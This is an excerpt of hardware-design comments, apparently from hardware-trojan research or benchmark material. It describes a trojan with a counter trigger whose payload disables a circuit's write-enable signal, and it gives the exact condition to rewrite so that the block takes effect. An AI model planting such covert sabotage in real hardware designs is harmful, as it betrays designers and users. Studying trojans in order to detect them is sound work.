 ...
 * 
 * Description:
 *   Disables operations by blocking we_i control signal
 *   
 * Trigger: Counter on we_i
 * Payload: Block we_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block we_i when trojan is active
//
// IMPORTANT: we_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (we_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: we_i && 0 = 0 (always false)
//   All operations controlled by we_i are blocked
